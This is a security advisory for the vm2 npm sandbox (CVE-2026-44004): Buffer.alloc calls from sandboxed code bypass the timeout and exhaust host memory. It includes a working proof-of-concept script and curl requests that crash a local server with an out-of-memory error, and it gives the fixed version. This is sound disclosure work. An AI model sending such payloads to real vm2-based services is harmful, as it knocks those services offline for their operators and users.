# [H] vm2 Sandbox Access to Host Buffer.alloc Allows timeout Bypass Resulting in Memory Exhaustion

## Summary
Severity: High
Advisory: GHSA-6785-pvv7-mvg7
CVE: CVE-2026-44004
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-07
Source: https://github.com/advisories/GHSA-6785-pvv7-mvg7
Type: github-advisory

## Affected
- npm: `vm2` — affected >=0 <3.11.0

## Details
### Summary
Sandboxed code can call `Buffer.alloc()` with an arbitrary size to allocate memory directly on the host heap. Because `Buffer.alloc` is a synchronous C++ native call, vm2's `timeout` option cannot interrupt it. A single request can exhaust host memory and crash the process with a `FATAL ERROR: Reached heap limit`.

### Details
In `lib/vm.js:58`, `Buffer` is exposed to the sandbox through the `HOST` object. The bridge proxy (`lib/bridge.js`) passes `Buffer.alloc()` calls to the host without any size validation.

Key technical distinction from regular JavaScript memory exhaustion (e.g., `while(true) a.push(...)`):
- **JavaScript loops**: V8 can interrupt via timeout — vm2's `timeout` option works
- **`Buffer.alloc(N)`**: Executes as a single synchronous C++ call — V8 timeout has no opportunity to interrupt

This means:
1. `timeout: 5000` does NOT protect against this attack
2. A single call allocates the entire requested size at once
3. In memory-constrained environments (Docker, Lambda, Kubernetes pods), this causes immediate OOM crash

Tested amplification factor: ~100 bytes HTTP request — 1,000,000:1 or greater (100 bytes request to 100MB+ host heap allocation).

### PoC

**Library-level PoC (Node.js script — primary):**
```javascript
const { VM } = require("vm2");
const vm = new VM({ timeout: 5000 });

// Buffer.alloc bypasses timeout — allocates 100MB on host heap
const result = vm.run(`Buffer.alloc(1024*1024*100).length`);
console.log(result); // 104857600 — timeout had no effect

// Control test — JavaScript loop IS caught by timeout
try {
  vm.run(`var a=[]; while(true) a.push(1)`);
} catch(e) {
  console.log(e.message); // "Script execution timed out after 5000ms"
}
```

**HTTP demonstration (OOM crash):**
```bash
# 1. Confirm server is running
curl -s http://localhost:3000/api/execute \
  -X POST -H "Content-Type: application/json" \
  -d '{"code":"\"alive\""}'
# => {"result":"\"alive\""}

# 2. Send Buffer.alloc payload — process crashes with OOM
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"Buffer.alloc(1024*1024*100).length"}'
# => empty response (process died)

# 3. Check server logs:
# FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory

# Control test — JavaScript loop IS caught by timeout:
curl -s -X POST http://localhost:3000/api/execute \
  -H "Content-Type: application/json" \
  -d '{"code":"var a=[]; while(true) a.push(1)"}'
# => {"errors":["Script execution timed out after 5000ms"]}
# Server stays alive — timeout works for JS, but NOT for Buffer.alloc
```

### Impact
- **DoS**: A single HTTP request crashes the host Node.js process via OOM. The `timeout` option provides no protection.
- **Environment-dependent severity**:
  - **Memory-constrained environments** (Docker with memory limits, Kubernetes pods, Lambda): The allocation exceeds the memory limit, causing immediate process termination via OOM. This is the primary threat scenario — `FATAL ERROR: Reached heap limit` was confirmed in testing.
  - **Unconstrained environments**: The allocation succeeds and memory is reclaimed by GC after the request completes, resulting in temporary performance degradation rather than a crash.
- **Scope**: All applications using vm2. Default configuration is vulnerable. Memory-constrained environments (Docker, Kubernetes, Lambda) are most severely impacted.

## References
- https://github.com/patriksimek/vm2/security/advisories/GHSA-6785-pvv7-mvg7
- https://nvd.nist.gov/vuln/detail/CVE-2026-44004
- https://github.com/patriksimek/vm2
- https://github.com/patriksimek/vm2/releases/tag/v3.11.0
